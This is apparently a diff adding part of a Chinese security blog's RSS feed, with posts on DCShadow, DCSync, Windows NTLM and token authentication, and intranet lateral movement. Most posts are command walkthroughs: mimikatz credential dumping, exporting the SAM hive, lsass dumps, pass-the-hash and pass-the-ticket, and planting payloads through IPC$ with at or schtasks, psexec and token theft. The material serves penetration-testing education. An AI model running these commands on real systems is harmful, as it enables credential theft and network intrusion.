+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 153; 
+			flex-basis: 368px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314160705805.png&#34; data-size=&#34;1000x651&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314160705805.png&#34;
+			width=&#34;1000&#34;
+			height=&#34;651&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-11/image-20220314160705805_hu942f5b4ad7eeca0c18e8ad3ac4fdd262_321581_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-11/image-20220314160705805_hu942f5b4ad7eeca0c18e8ad3ac4fdd262_321581_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;运行 DRS 服务，最少需要实现 &lt;code&gt;IDL_DRSBind、IDL_DRSUnbind、IDL_DRSGetNCChanges、IDL_DRSUpdateRefs &lt;/code&gt;这 4 个 RPC 接口，以便其他 DC 能够通过 RPC 获取需要复制的数据。Mimikatz 工具的最新版已经集成了这 4 个接口&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;发起复制&#34;&gt;发起复制&lt;/h3&gt;
+&lt;p&gt;通常负责域复制和同步的进程是 KCC 进程，默认时间是 15 分钟校验一次，如果需要复制则发起;也可以使用 Windows 域服务器自带的系统工具 repadmin，该工具会调用&lt;code&gt; DRSReplicaAdd&lt;/code&gt; 函数接口强制立即发起域复制，DCShadow 正是通过调用·&lt;code&gt;DRSReplicaAdd&lt;/code&gt; 函数强制立即发起域复制。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>DCSync 攻击</title>
+        <link>https://coollllllll.github.io/p/intranet-10/</link>
+        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://coollllllll.github.io/p/intranet-10/</guid>
+        <description>&lt;img src="https://coollllllll.github.io/p/intranet-10/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post DCSync 攻击" /&gt;&lt;h1 id=&#34;dcsync-攻击&#34;&gt;DCSync 攻击&lt;/h1&gt;
+&lt;h2 id=&#34;背景&#34;&gt;背景&lt;/h2&gt;
+&lt;p&gt;2015 年 8 月，Benjamin Delpy(神器 Mimikatz 的作者)和 Vincent Le Toux 发布了新版本的 Mimikatz，新增加了 DCSync 功能。模仿一个域控制器 DC，从真实的域控制器中请求获取数据，例如账号的口令散列值等数据。&lt;/p&gt;
+&lt;p&gt;DCSync 之前，获取域的账号口令信息，需要登录域服务器，在域服务器上运行代码才可以获取。而DCSync 的最大特点，在于不用登录域服务器，即可远程通过域数据同步复制的方式获得想要的用户口令信息。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;注意：&lt;/p&gt;
+&lt;p&gt;DCSync 攻击的对象如果是 RODC 域控制器，则会失效，因为 RODC 不能参与复制同步数据。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;原理&#34;&gt;原理&lt;/h2&gt;
+&lt;p&gt;本质就是利用 DC 间的数据同步复制。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;发现网络中的目标域控制器&lt;/li&gt;
+&lt;li&gt;通过 DRS 服务的 GetNCChanges 接口发起数据同步请求，Directory Replication Service (DRS) Remote Protocol&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Samba wiki 关于 GetNCChanges 的描述包括：&lt;/p&gt;
+&lt;p&gt;当一个 DC (成为客户端 DC)想从其他 DC (成为服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。&lt;/p&gt;
+&lt;p&gt;如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;条件&#34;&gt;条件&lt;/h2&gt;
+&lt;p&gt;某用户想要发起 DCSync 攻击，必须具备以下权限：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Replicating Directory Changes (DS-Replication-Get-Changes)&lt;/li&gt;
+&lt;li&gt;Replicating Directory Changes All (DS-Replication-Get-Changes-All)&lt;/li&gt;
+&lt;li&gt;Replicating Directory Changes In Filtered Set&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 98; 
+			flex-basis: 235px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145221023.png&#34; data-size=&#34;1006x1025&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145221023.png&#34;
+			width=&#34;1006&#34;
+			height=&#34;1025&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145221023_hu331e2b2bbfe170c8c4eea701982ffe60_796442_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-10/image-20220314145221023_hu331e2b2bbfe170c8c4eea701982ffe60_796442_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 161; 
+			flex-basis: 386px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145231925.png&#34; data-size=&#34;1004x623&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145231925.png&#34;
+			width=&#34;1004&#34;
+			height=&#34;623&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145231925_hu1a3b2c3a832c079027deb5256ff66959_344027_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-10/image-20220314145231925_hu1a3b2c3a832c079027deb5256ff66959_344027_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;在默认情况下，只有 &lt;strong&gt;Administrators、Domain Controllers 和 Enterprise Domain Admins&lt;/strong&gt; 组内的用户有权限使用 DCSync，但我们可以对域内普通用户添加 ACL (Access Control List) 实现普通用户也能调用 DCSync 功能。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;攻击&#34;&gt;攻击&lt;/h2&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 导出指定用户
+lsadump::dcsync /domain:rd.adsecurity.org /user:administrator 
+
+# 导出域内所有用户
+lsadump::dcsync /domain:rd.adsecurity.org /all
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 143; 
+			flex-basis: 343px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145824172.png&#34; data-size=&#34;1007x704&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145824172.png&#34;
+			width=&#34;1007&#34;
+			height=&#34;704&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-10/image-20220314145824172_hu8541a771b7d54fd8c5b0d9c321d869fa_733918_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-10/image-20220314145824172_hu8541a771b7d54fd8c5b0d9c321d869fa_733918_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h2 id=&#34;防御&#34;&gt;防御&lt;/h2&gt;
+&lt;p&gt;最好的防御方法是给域控制器设置白名单。在域内，域控制器的数量、IP地址、MAC 地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的 IP 不允许发生数据同步。&lt;/p&gt;
+&lt;p&gt;获取域内所有 IP 的脚本：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PowerShell:Get-ADDomainController -filter * | select IPv4Address
+
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers | select IPAddress
+&lt;/code&gt;&lt;/pre&gt;</description>
+        </item>
+        <item>
+        <title>Windows 认证</title>
+        <link>https://coollllllll.github.io/p/intranet-12/</link>
+        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://coollllllll.github.io/p/intranet-12/</guid>
+        <description>&lt;img src="https://coollllllll.github.io/p/intranet-12/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post Windows 认证" /&gt;&lt;h1 id=&#34;windows-认证&#34;&gt;Windows 认证&lt;/h1&gt;
+&lt;p&gt;Windows 认证方式主要有两种：NTLM 认证、kerberos 认证。同时，Windows Access Token 记录着用户的SID、组ID、Session、及权限等信息，也起到了权限认证的作用。&lt;/p&gt;
+&lt;p&gt;其中 NTLM 认证主要有&lt;strong&gt;本地认证&lt;/strong&gt;和&lt;strong&gt;网络认证&lt;/strong&gt;两种方式。&lt;/p&gt;
+&lt;h2 id=&#34;本地认证&#34;&gt;本地认证&lt;/h2&gt;
+&lt;h3 id=&#34;ntlm&#34;&gt;NTLM&lt;/h3&gt;
+&lt;p&gt;NTLM Hash 是支持 Net NTLM 认证协议及本地认证过程中的一个重要参与物，其长度为 32 位，由数字与字母组成。 Windows 本身不存储用户的明文密码，它会将用户的明文密码经过加密算法后存储在 SAM 数据库中。 当用户登录时,将用户输入的明文密码也加密成 NTLM Hash,与 SAM 数据库中的 NTLM Hash 进行比较。NTLM Hash 的前身是 LM Hash，目前基本淘汰，但是还是存在。&lt;/p&gt;
+&lt;p&gt;SAM 文件一般在&lt;code&gt;%SystemRoot%\system32\config\sam&lt;/code&gt;：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 105; 
+			flex-basis: 253px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-12/image-20220314170924968.png&#34; data-size=&#34;851x807&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-12/image-20220314170924968.png&#34;
+			width=&#34;851&#34;
+			height=&#34;807&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-12/image-20220314170924968_hube41ac9a0b62677678cba31dad5a6fe1_233701_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-12/image-20220314170924968_hube41ac9a0b62677678cba31dad5a6fe1_233701_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;NTLM hash 的产生：&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;admin -&amp;gt; hex(16进制编码) = 61646d696e
+61646d696e -&amp;gt; Unicode = 610064006d0069006e00
+610064006d0069006e00 -&amp;gt; MD4 = 209c6174da490caeb422f3fa5a7ae634
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;流程&#34;&gt;流程&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Windows Logon Process，即 winlogon.exe， 是 Windows NT 用户登陆程序，用于管理用户登录和退出。&lt;/li&gt;
+&lt;li&gt;LSASS 是微软 Windows 系统的安全机制。用于本地安全和登录策略。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;winlogon.exe -&amp;gt; 接收用户输入的账密 -&amp;gt; lsass.exe -&amp;gt; 转换NTLM hash 并与 SAM 文件中的进行对比 -&amp;gt; 相同则将user SID 和 group SID 发给 winlogon.exe，准备桌面，登录成功
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;网络认证&#34;&gt;网络认证&lt;/h2&gt;
+&lt;p&gt;内网渗透中，经常遇到工作组环境，而工作组环境是一个逻辑上的网络环境(工作区)，隶属于工作组的机器之间无法互相建立一个完美的信任机制，只能点对点，是比较落后的认证方式，没有信托机构。&lt;/p&gt;
+&lt;p&gt;网络认证则是基于一种 Challenge/Response 认证机制(&lt;strong&gt;NTLM 协议&lt;/strong&gt;)的认证模式。例如 SMB 文件共享。&lt;/p&gt;
+&lt;h3 id=&#34;流程-1&#34;&gt;流程&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;协商：主要用于确认双方协议版本、加密等级等。&lt;/li&gt;
+&lt;li&gt;质询
+&lt;ul&gt;
+&lt;li&gt;客户端向服务器端发送用户信息(用户名)。&lt;/li&gt;
+&lt;li&gt;服务器收到请求，生成 &lt;strong&gt;16 位随机数&lt;/strong&gt;，称之为&amp;quot;Challenge&amp;quot;，随后使用登录用户名对应的 NTLM hash 加密 Challenge，得到 Challenge1。将 Challenge 发送给客户端。&lt;/li&gt;
+&lt;li&gt;客户端得到 Challenge 后，使用登录账户的 NTLM hash 加密 Challenge 得到 Response，随后将Response 发送给服务端。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;验证：服务端校验收到的 Response 是否与 Chanllenge1 相等，相等则认证通过。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 462; 
+			flex-basis: 1110px&#34;
+	&gt;
+	&lt;a href=&#34;https://coollllllll.github.io/p/intranet-12/image-20220314193038084.png&#34; data-size=&#34;1161x251&#34;&gt;
+		&lt;img src=&#34;https://coollllllll.github.io/p/intranet-12/image-20220314193038084.png&#34;
+			width=&#34;1161&#34;
+			height=&#34;251&#34;
+			srcset=&#34;https://coollllllll.github.io/p/intranet-12/image-20220314193038084_hu1be0987448aea897ecff590ac33943a9_128787_480x0_resize_box_3.png 480w, https://coollllllll.github.io/p/intranet-12/image-20220314193038084_hu1be0987448aea897ecff590ac33943a9_128787_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			&gt;
+	&lt;/a&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ntlm-v1-和-v2-区别&#34;&gt;NTLM v1 和 v2 区别&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;NTLM v1 的 Challenge 有 &lt;code&gt;8&lt;/code&gt; 位，NTLM v2 的 Challenge 为 &lt;code&gt;16&lt;/code&gt; 位&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;NTLM v1 的主要加密算法是 &lt;code&gt;DES&lt;/code&gt;，NTLM v2 的主要加密算法是 &lt;code&gt;HMAC-MD5&lt;/code&gt;(实际实现下，可能使用更好的算法)。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;windows-access-token&#34;&gt;Windows Access Token&lt;/h2&gt;
+&lt;h3 id=&#34;简介&#34;&gt;简介&lt;/h3&gt;
+&lt;p&gt;Windows Token，也叫Access Token(访问令牌)，它是一个描述&lt;strong&gt;进程或者线程安全上下文&lt;/strong&gt;的一个对象。不同的用户登录计算机后，都会生成一个Access Token，这个 Token 在用户创建进程或者线程时会被使用，并不断拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限。&lt;/p&gt;
+&lt;h3 id=&#34;种类&#34;&gt;种类&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Delegation token(授权令牌):用于交互会话登录(例如本地用户直接登录、远程桌面登录)&lt;/li&gt;
+&lt;li&gt;Impersonation token(模拟令牌):用于非交互登录(利用net use访问共享文件夹)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;一般情况下，用户双击运行一个程序，都会拷贝“explorer.exe”的 Access Token。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;当用户注销，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Access Token 的组成：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;用户帐户的安全标识符(SID)&lt;/li&gt;
+&lt;li&gt;用户所属的组的SID&lt;/li&gt;
+&lt;li&gt;用于标识当前登录会话的登录SID&lt;/li&gt;
+&lt;li&gt;用户或用户组所拥有的权限列表&lt;/li&gt;
+&lt;li&gt;所有者SID&lt;/li&gt;
+&lt;li&gt;主要组的SID&lt;/li&gt;
+&lt;li&gt;访问控制列表&lt;/li&gt;
+&lt;li&gt;访问令牌的来源&lt;/li&gt;
+&lt;li&gt;令牌是主要令牌还是模拟令牌&lt;/li&gt;
+&lt;li&gt;限制SID的可选列表&lt;/li&gt;
+&lt;li&gt;目前的模拟等级&lt;/li&gt;
+&lt;li&gt;其他统计数据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;产生&#34;&gt;产生&lt;/h3&gt;
+&lt;p&gt;每个进程创建时都会根据登录会话权限由 LSA(Local Security Authority)分配一个 Token，如果CreaetProcess时自己指定了 Token, LSA 会使用该 Token， 否则就使用父进程 Token 的一份拷贝。&lt;/p&gt;
+&lt;h3 id=&#34;令牌假冒&#34;&gt;令牌假冒&lt;/h3&gt;
+&lt;p&gt;本质就是利用：用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Cobalt Strike&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;steal_token
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;MSF&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;meterpreter &amp;gt; getsystem
+meterpreter &amp;gt; load incognito 
+meterpreter &amp;gt; list_tokens –u
+meterpreter &amp;gt; impersonate_token &amp;quot;PAYLOADS\\Administrator”
+&lt;/code&gt;&lt;/pre&gt;</description>
+        </item>
+        <item>
+        <title>内网横向</title>
+        <link>https://coollllllll.github.io/p/intranet-15/</link>
+        <pubDate>Wed, 15 Dec 2021 00:00:00 +0000</pubDate>
+        
+        <guid>https://coollllllll.github.io/p/intranet-15/</guid>
+        <description>&lt;img src="https://coollllllll.github.io/p/intranet-15/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg" alt="Featured image of post 内网横向" /&gt;&lt;h1 id=&#34;内网横向&#34;&gt;内网横向&lt;/h1&gt;
+&lt;h2 id=&#34;windows-密码与-hash-抓取&#34;&gt;Windows 密码与 Hash 抓取&lt;/h2&gt;
+&lt;h3 id=&#34;mimikatz-直接读取明文密码&#34;&gt;mimikatz 直接读取明文密码&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug
+sekurlsa::logonpasswords
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;通过sam-和--system-文件抓取密码&#34;&gt;通过SAM 和  SYSTEM 文件抓取密码&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;导出SAM 和 SYSTEM文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;reg save hklm\sam sam.hive
+reg save hklm\system system.hive
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;mimikatz 离线读取文件获得 NTLM&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;lsadump::sam /sam:sam.hive system:system.hive
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;在目标机器上直接读取本地SAM文件&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;privilege::debug
+token::elevate
+lsadump::sam
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;mimikatz-离线读取-lassdmp-文件&#34;&gt;mimikatz 离线读取 lass.dmp 文件&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;使用Procdump(微软工具，免杀)工具导出 lass.dmp&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;使用 mimikatz 导出 lsass.dmp 文件中的密码值&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sekurlsa::mimidump lsass.dmp
+sekurlsa::logonpasswords full
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;windows-远程连接&#34;&gt;Windows 远程连接&lt;/h2&gt;
+&lt;h3 id=&#34;ipc&#34;&gt;IPC&lt;/h3&gt;
+&lt;p&gt;IPC$(Internet Process Connection) 是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;建立 ipc$ 连接的条件：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;目标主机开启了139和445端口&lt;/li&gt;
+&lt;li&gt;目标主机管理员开启了ipc$默认共享&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 通过账户:口令建立IPC
+net use \\IP\ipc$ &amp;quot;password&amp;quot; /user:&amp;quot;username&amp;quot;
+
+# 查看当前主机所建立的IPC
+net use
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;建立IPC后，可以使用如下命令进行一些基本操作：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;dir 命令&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 列出目标主机上的C盘
+dir \\IP\c$
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;copy&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 复制恶意文件到目标C盘
+copy C:\Users\douser\Desktop\shell.exe \\IP\c$
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;计划任务横向&#34;&gt;计划任务横向&lt;/h2&gt;
+&lt;h3 id=&#34;at-命令&#34;&gt;at 命令&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;用于 Windows server 2008 之前版本&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;建立IPC&lt;/li&gt;
+&lt;li&gt;查看目标当前时间&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net time \\IP
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;复制马到目标主机&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;k&#34;&gt;copy&lt;/span&gt; payload.bat \\IP\C$
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;创建计划任务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;at \\IP 7:00AM C:\payload.bat
+
+# 执行完毕返回任务ID
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;上线之后，删除计划任务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;at \\IP taskid /delete
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;schtakss-命令&#34;&gt;schtakss 命令&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;schtasks命令比at命令更为灵活、自由，用以代替at。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ul&gt;
+&lt;li&gt;建立IPC&lt;/li&gt;
+&lt;li&gt;复制马到目标主机&lt;/li&gt;
+&lt;li&gt;创建名为test的计划任务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;schtask /create /s IP /tn test /sc minute /tr c:\payload.bat /ru system /f
+
+# minute表明每分钟执行一次
+# 创建失败，比如拒绝访问错误，就是权限不够，可以使用/u /p 参数附带高权限用户
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;等计划任务运行，上线&lt;/li&gt;
+&lt;li&gt;也可以让其直接运行&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;schtasks /run /s ip /i /tn test
+
+# 权限不够，附加用户和密码
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;上线后，删除计划任务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;schtasks /delete /s ip /tn &amp;quot;test&amp;quot; /f
+&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
+&lt;p&gt;在使用schtasks命令时，会在系统中留下日志文件：C:\Windows\Tasks\SchedLgU.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;pth-攻击&#34;&gt;PTH 攻击&lt;/h2&gt;
+&lt;h3 id=&#34;ntlm-hash-传递&#34;&gt;NTLM Hash 传递&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz &amp;quot;privilege::debug&amp;quot; &amp;quot;sekurlsa::pth /user:administrator /domain:pentest.hacker /ntlm:[NTLM]&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;aes-256-密钥进行哈希传递&#34;&gt;AES-256 密钥进行哈希传递&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;使用 mimikatz 抓取 AES-256 密钥&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz &amp;quot;privilege::debug&amp;quot; &amp;quot;sekurlsa::ekeys&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;pth攻击（目标机器安装 KB2871997）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;mimikatz &amp;quot;privilege::debug&amp;quot; &amp;quot;sekurlsa::pth /user:administrator /domain:pentest.hacker /aes256:[aes256]&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;票据传递&#34;&gt;票据传递&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;基于ms14-068生成TGT&lt;/li&gt;
+&lt;li&gt;使用mimikatz将票据注入内存&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;kerberos::purge         
+kerberos::list          
+kerberos::ptt C:\xxx.kirbi 
+&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
+&lt;li&gt;访问域内其他主机&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;psexec&#34;&gt;psexec&lt;/h2&gt;
+&lt;p&gt;psexec 是 windows 下非常好的一款远程命令行工具。属于微软官方，所以一般是免杀的。&lt;/p&gt;
+&lt;h3 id=&#34;原理&#34;&gt;原理&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;通过ipc$连接，释放二进制文件psexecsvc.exe到目标&lt;/li&gt;
+&lt;li&gt;通过服务管理SCManager远程创建一个psexec服务，并启动服务&lt;/li&gt;
+&lt;li&gt;客户端连接执行命令，服务端通过服务启动相应的程序执行命令并回显数据&lt;/li&gt;
+&lt;li&gt;运行结束后删除服务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;条件&#34;&gt;条件&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;对方主机开启了 admin$ 共享，如果关闭了admin$共享，会提示：找不到网络名&lt;/li&gt;
+&lt;li&gt;对方未开启防火墙&lt;/li&gt;
+&lt;li&gt;如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问&lt;/li&gt;
+&lt;li&gt;如果是域环境，连接普通域主机可以用普通域用户，连接域控只能用域管理员账户&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;使用&#34;&gt;使用&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;建立IPC&lt;/li&gt;
+&lt;li&gt;获取 System 权限的 交互式shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PsExec.exe -accepteula \\IP -s cmd.exe
+
+# 直接执行命令
+PsExec.exe -accepteula \\IP -s cmd.exe /c ipconfig
+
+# 缺少-s将返回Administrator 权限的 shell
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;msf&#34;&gt;MSF&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;exploit/windows/smb/psexec
+
+exploit/windows/smb/psexec_psh（powershell 版本）
